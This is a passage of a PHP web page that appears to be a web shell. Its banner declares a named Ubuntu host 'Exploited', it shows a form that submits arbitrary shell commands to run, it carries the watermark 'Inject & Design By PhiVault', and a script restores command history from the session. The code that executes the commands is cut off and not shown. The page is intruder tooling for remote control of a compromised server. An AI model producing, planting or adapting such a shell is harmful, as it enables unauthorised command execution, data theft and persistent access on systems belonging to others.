...
<body>
<div class="container">
    <h2>This is Linux CVRaman73674 5.15.0-133-generic #144-Ubuntu SMP x86_64 GNU/Linux Exploited</h2>
    ...
    <form method="post" id="cmdForm">
        <input type="text" name="cmd" id="cmdInput" autofocus autocomplete="off" placeholder="Enter command">
        <input type="submit" value="Run">
    </form>
</div>

<div class="watermark">Inject & Design By PhiVault</div>

<script>
    const root = document.documentElement;
    const terminal = document.getElementById("terminal");
    const cmdInput = document.getElementById("cmdInput");
    let history = <?php echo json_encode(array_column($_SESSION['history'] ?? [], 'cmd')); ?>;
